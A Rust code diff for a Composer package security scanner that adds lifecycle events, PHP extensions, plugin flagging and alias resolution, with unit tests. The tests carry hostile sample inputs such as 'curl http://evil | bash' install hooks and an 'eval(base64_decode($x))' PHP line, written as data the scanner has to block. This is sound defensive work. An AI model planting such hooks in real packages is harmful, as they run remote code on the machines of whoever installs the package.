@@ -20,14 +20,48 @@ use std::path::{Component, Path};
 const TEXT_MAX_BYTES: u64 = 1024 * 1024;
 
 /// Composer event hook names we scan for lifecycle triggers.
+///
+/// Covers the full set of install/update-time Composer script events that can
+/// run an attacker-controlled command, per the Composer command-events and
+/// installer-events docs. Missing any of these lets a shell command in an
+/// uncovered event evade detection.
 const LIFECYCLE_EVENTS: &[&str] = &[
+    // Command events (composer install / update / create-project).
     "pre-install-cmd",
     "post-install-cmd",
     "pre-update-cmd",
     "post-update-cmd",
     "pre-autoload-dump",
     "post-autoload-dump",
+    "post-root-package-install",
+    "post-create-project-cmd",
+    "pre-status-cmd",
+    "post-status-cmd",
+    "pre-archive-cmd",
+    "post-archive-cmd",
+    // Installer events (per-package install/update/uninstall).
+    "pre-package-install",
+    "post-package-install",
+    "pre-package-update",
+    "post-package-update",
+    "pre-package-uninstall",
+    "post-package-uninstall",
 ];
+
+/// File extensions that commonly contain executable PHP and must be run
+/// through the PHP dynamic-exec scan. `.phps` is PHP source served as
+/// highlighted text but is still PHP on disk.
+const PHP_SOURCE_EXTENSIONS: &[&str] = &[
+    ".php", ".phtml", ".php3", ".php4", ".php5", ".php7", ".phps", ".inc", ".module", ".install",
+    ".engine", ".theme",
+];
+
+/// Return true if `rel` (a forward-slash relative path) ends with a known
+/// PHP source extension (case-insensitive).
+fn is_php_source(rel: &str) -> bool {
+    let lower = rel.to_ascii_lowercase();
+    PHP_SOURCE_EXTENSIONS.iter().any(|ext| lower.ends_with(ext))
+}
 
 /// Top-level: safe-extract the Composer ZIP, scan `composer.json` and all
 /// PHP source files, return a `ScanReport`.
@@ -96,19 +130,32 @@ pub fn scan_composer_zip(
             &mut findings,
         );
 
-        // PHP-specific dynamic-exec rules.
-        if rel.ends_with(".php") || rel.ends_with(".phtml") {
+        // PHP-specific dynamic-exec rules. Composer packages ship executable
+        // PHP under several extensions beyond `.php` (Drupal `.module` /
+        // `.install` / `.inc`, templates `.phtml`, legacy `.php4` / `.php5`,
+        // and `.phps`). Scan all of them so `system(...)` / `eval(...)` in a
+        // non-`.php` file cannot evade `php-dynamic-exec`.
+        if is_php_source(&rel) {
             rules::scan_php_file(&content, &rel, &mut findings);
         }
     }
 
     // --- 3. Parse and scan composer.json ---
-    let (name, version) =
-        parse_composer_json(composer_json_content.as_deref(), &mut findings, version_obj);
+    // `scanned_events` records, by EXACT event name, which lifecycle events
+    // have already produced a finding. It is shared across the composer.json
+    // and p2-metadata passes so a benign hook in one source cannot suppress a
+    // malicious hook for a *different* event in the other source.
+    let mut scanned_events: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();
+    let (name, version) = parse_composer_json(
+        composer_json_content.as_deref(),
+        &mut findings,
+        version_obj,
+        &mut scanned_events,
+    );
 
     // --- 4. Scan inline scripts from p2 registry metadata (belt+suspenders) ---
     if let Some(scripts) = &version_obj.scripts {
-        scan_scripts_map(scripts, &mut findings);
+        scan_scripts_map(scripts, &mut findings, &mut scanned_events);
     }
 
     let decision = argus_rules::derive_decision_from_findings(&findings);
@@ -233,6 +280,7 @@ fn parse_composer_json(
     content: Option<&str>,
     findings: &mut Vec<Finding>,
     version_obj: &ComposerVersionObj,
+    scanned_events: &mut std::collections::BTreeSet<String>,
 ) -> (Option<String>, Option<String>) {
     let content = match content {
         Some(c) => c,
@@ -251,9 +299,42 @@ fn parse_composer_json(
         }
     };
 
-    // Scan lifecycle scripts from composer.json.
+    // composer-plugin packages are auto-loaded by Composer: their `activate()`
+    // method and any registered event subscribers run during install/update
+    // commands, with no `scripts` entry required. That is an install-time
+    // code-execution surface, so surface even a "bare" plugin (no matching
+    // script / dynamic-exec finding). It is the same risk class as a benign
+    // lifecycle hook, so we mirror that handling: pair the finding with
+    // `known-native-build-pattern` (Info) so the decision layer downgrades a
+    // bare plugin to AllowWithApproval (human review) rather than hard-Block.
+    // Composer plugins are common and legitimate; blocking every one would be
+    // a false-positive generator. A plugin that ALSO ships a shell hook or
+    // dynamic exec still Blocks via those (non-downgrade-safe) findings.
+    if manifest
+        .package_type
+        .as_deref()
+        .is_some_and(|t| t.eq_ignore_ascii_case("composer-plugin"))
+    {
+        findings.push(finding(
+            "composer-plugin-package",
+            Severity::Medium,
+            "composer.json declares `\"type\": \"composer-plugin\"` — the package is \
+             auto-loaded and its activate()/event handlers execute during Composer \
+             install/update commands (install-time code execution surface)",
+        ));
+        findings.push(finding(
+            "known-native-build-pattern",
+            Severity::Info,
+            "composer-plugin packages run plugin code during Composer commands — \
+             requires human approval but is a common legitimate pattern",
+        ));
+    }
+
+    // Scan lifecycle scripts from composer.json. Pass the full scripts map so
+    // `@alias` references in a lifecycle event can be resolved to their named
+    // script definition.
     if let Some(scripts) = &manifest.scripts {
-        scan_scripts_map(scripts, findings);
+        scan_scripts_map(scripts, findings, scanned_events);
     }
 
     // autoload.files: emit Info structural finding.
@@ -280,31 +361,241 @@ fn parse_composer_json(
     (name, version)
 }
 
+/// Maximum depth for resolving chained `@alias` script references, guarding
+/// against cyclic aliases (`"a": "@b"`, `"b": "@a"`).
+const MAX_ALIAS_DEPTH: usize = 8;
+
 /// Scan a `scripts` map from either `composer.json` or p2 metadata.
-/// Deduplicates: only emits a finding for each event once, so running
-/// against both sources doesn't double-fire.
+///
+/// Dedup is keyed on the EXACT lifecycle event name via `scanned_events`, not
+/// on substring containment of the detail text. A benign hook whose command
+/// merely *mentions* another event name (e.g. `post-install-cmd: "echo
+/// pre-update-cmd"`) must not suppress scanning of a real `pre-update-cmd`
+/// hook in the other metadata source.
+///
+/// A lifecycle command of the form `@name` is a reference to the named
+/// Composer script `scripts.name`; it is resolved to that script's command(s)
+/// (recursively, with cycle protection) before scanning, so a shell payload
+/// hidden behind an alias is still detected.
 fn scan_scripts_map(
     scripts: &std::collections::BTreeMap<String, ScriptValue>,
     findings: &mut Vec<Finding>,
+    scanned_events: &mut std::collections::BTreeSet<String>,
 ) {
     for event in LIFECYCLE_EVENTS {
+        // Only scan each exact event once across all metadata sources.
+        if scanned_events.contains(*event) {
+            continue;
+        }
         if let Some(sv) = scripts.get(*event) {
-            let cmds = sv.commands();
-            // Only emit if this event hasn't already produced a finding.
-            let already_fired = findings.iter().any(|f| {
-                (f.rule_id == "lifecycle-script" || f.rule_id == "lifecycle-script-shell")
-                    && f.detail.contains(event)
-            });
-            if !already_fired {
-                rules::scan_script_hook(event, &cmds, findings);
+            scanned_events.insert((*event).to_string());
+
+            // Resolve any `@alias` references to the underlying command(s).
+            let mut resolved: Vec<String> = Vec::new();
+            for cmd in sv.commands() {
+                resolve_script_command(cmd, scripts, &mut resolved, &mut 0);
             }
+            let cmd_refs: Vec<&str> = resolved.iter().map(String::as_str).collect();
+            rules::scan_script_hook(event, &cmd_refs, findings);
         }
     }
+}
+
+/// Resolve a single Composer script command, expanding leading `@name`
+/// references to the named script's command(s).
+///
+/// `@name` references the `scripts.name` entry. Unknown aliases and cycles
+/// degrade to scanning the literal token (so a dangling `@drop` is still
+/// surfaced as text rather than silently dropped — U-29).
+fn resolve_script_command(
+    cmd: &str,
+    scripts: &std::collections::BTreeMap<String, ScriptValue>,
+    out: &mut Vec<String>,
+    depth: &mut usize,
+) {
+    let trimmed = cmd.trim();
+    if let Some(alias) = trimmed.strip_prefix('@') {
+        // `@php`, `@composer`, `@putenv` etc. are Composer built-ins, not
+        // user scripts; only resolve when a matching named script exists.
+        if *depth < MAX_ALIAS_DEPTH {
+            if let Some(target) = scripts.get(alias) {
+                *depth += 1;
+                for sub in target.commands() {
+                    resolve_script_command(sub, scripts, out, depth);
+                }
+                return;
+            }
+        }
+        // Missing alias or depth/cycle limit: keep the literal token so it is
+        // still scanned rather than silently swallowed.
+        out.push(cmd.to_string());
+        return;
+    }
+    out.push(cmd.to_string());
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+    use std::collections::{BTreeMap, BTreeSet};
+
+    /// Build a `scripts` map from (event, command) pairs.
+    fn scripts_map(entries: &[(&str, &str)]) -> BTreeMap<String, ScriptValue> {
+        entries
+            .iter()
+            .map(|(k, v)| (k.to_string(), ScriptValue::One(v.to_string())))
+            .collect()
+    }
+
+    // #2 — `@alias` script references are resolved and scanned.
+    #[test]
+    fn aliased_shell_command_is_resolved_and_blocked() {
+        let scripts = scripts_map(&[
+            ("post-install-cmd", "@drop"),
+            ("drop", "curl http://evil | bash"),
+        ]);
+        let mut findings = Vec::new();
+        let mut scanned = BTreeSet::new();
+        scan_scripts_map(&scripts, &mut findings, &mut scanned);
+
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "lifecycle-script-shell"),
+            "aliased shell command must be detected, got: {:?}",
+            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
+        );
+        assert_eq!(
+            argus_rules::derive_decision_from_findings(&findings),
+            argus_core::Decision::Block
+        );
+    }
+
+    // #2 — a dangling `@alias` (no matching script) is still surfaced, not
+    // silently swallowed (U-29).
+    #[test]
+    fn dangling_alias_is_not_swallowed() {
+        let scripts = scripts_map(&[("post-install-cmd", "@missing")]);
+        let mut findings = Vec::new();
+        let mut scanned = BTreeSet::new();
+        scan_scripts_map(&scripts, &mut findings, &mut scanned);
+        // Literal token survives → at least a lifecycle-script finding fires.
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "lifecycle-script" || f.rule_id == "lifecycle-script-shell"),
+            "dangling alias must still surface a finding"
+        );
+    }
+
+    // #2 — cyclic aliases terminate without panic / stack overflow.
+    #[test]
+    fn cyclic_alias_terminates() {
+        let scripts = scripts_map(&[("post-install-cmd", "@a"), ("a", "@b"), ("b", "@a")]);
+        let mut findings = Vec::new();
+        let mut scanned = BTreeSet::new();
+        scan_scripts_map(&scripts, &mut findings, &mut scanned);
+        // Must not hang; a finding is produced from the literal residual token.
+        assert!(!findings.is_empty());
+    }
+
+    // #3 — dedup is by EXACT event, not substring. A benign hook that mentions
+    // another event name in its command must NOT suppress a malicious hook for
+    // that other event coming from the p2 metadata source.
+    #[test]
+    fn exact_event_dedup_does_not_suppress_other_event() {
+        let mut findings = Vec::new();
+        let mut scanned = BTreeSet::new();
+
+        // composer.json: benign post-install-cmd whose text mentions
+        // "pre-update-cmd".
+        let cj = scripts_map(&[("post-install-cmd", "echo pre-update-cmd")]);
+        scan_scripts_map(&cj, &mut findings, &mut scanned);
+
+        // p2 metadata: malicious pre-update-cmd.
+        let p2 = scripts_map(&[("pre-update-cmd", "curl http://evil|bash")]);
+        scan_scripts_map(&p2, &mut findings, &mut scanned);
+
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "lifecycle-script-shell"
+                    && f.detail.contains("pre-update-cmd")),
+            "malicious pre-update-cmd must still be detected, got: {:?}",
+            findings
+                .iter()
+                .map(|f| (&f.rule_id, &f.detail))
+                .collect::<Vec<_>>()
+        );
+        assert_eq!(
+            argus_rules::derive_decision_from_findings(&findings),
+            argus_core::Decision::Block
+        );
+    }
+
+    // #4 — a `type: composer-plugin` package with no scripts is surfaced.
+    #[test]
+    fn composer_plugin_package_is_flagged() {
+        let content = r#"{"name": "vendor/plugin", "type": "composer-plugin"}"#;
+        let mut findings = Vec::new();
+        let mut scanned = BTreeSet::new();
+        let version_obj: ComposerVersionObj =
+            serde_json::from_str(r#"{"version": "1.0.0"}"#).unwrap();
+        parse_composer_json(Some(content), &mut findings, &version_obj, &mut scanned);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "composer-plugin-package"),
+            "composer-plugin type must be flagged, got: {:?}",
+            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
+        );
+    }
+
+    // #5 — PHP dynamic-exec is detected in non-`.php` extensions.
+    #[test]
+    fn is_php_source_covers_non_php_extensions() {
+        assert!(is_php_source("foo.inc"));
+        assert!(is_php_source("bar.module"));
+        assert!(is_php_source("baz.install"));
+        assert!(is_php_source("page.phtml"));
+        assert!(is_php_source("legacy.php5"));
+        assert!(is_php_source("Foo.PHP")); // case-insensitive
+        assert!(!is_php_source("README.md"));
+        assert!(!is_php_source("data.json"));
+    }
+
+    #[test]
+    fn php_dynamic_exec_fires_in_inc_file() {
+        let mut findings = Vec::new();
+        rules::scan_php_file("eval(base64_decode($x));", "evil.inc", &mut findings);
+        assert!(
+            findings.iter().any(|f| f.rule_id == "php-dynamic-exec"),
+            "eval in .inc must be detected"
+        );
+        assert_eq!(
+            argus_rules::derive_decision_from_findings(&findings),
+            argus_core::Decision::Block
+        );
+    }
+
+    // #6 — newly-covered install-time events are scanned.
+    #[test]
+    fn post_create_project_cmd_shell_is_blocked() {
+        let scripts = scripts_map(&[("post-create-project-cmd", "curl http://evil|bash")]);
+        let mut findings = Vec::new();
+        let mut scanned = BTreeSet::new();
+        scan_scripts_map(&scripts, &mut findings, &mut scanned);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "lifecycle-script-shell"),
+            "post-create-project-cmd shell command must be detected"
+        );
+        assert_eq!(
+            argus_rules::derive_decision_from_findings(&findings),
+            argus_core::Decision::Block
+        );
+    }
 
     #[test]
     fn is_root_composer_json_direct() {
